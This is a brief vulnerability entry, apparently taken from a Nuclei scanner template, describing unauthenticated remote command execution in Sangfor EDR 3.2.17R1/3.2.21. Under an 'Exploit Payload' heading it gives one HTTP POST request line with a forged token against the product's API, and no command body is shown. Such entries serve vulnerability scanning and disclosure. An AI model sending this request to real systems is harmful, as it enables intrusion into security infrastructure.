# Vulnerability: Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`sangfor-edr-rce.yaml`)

## Description
Sangfor EDR 3.2.17R1/3.2.21 allows remote unauthenticated users to to execute arbitrary commands.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{BaseURL}}/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
```

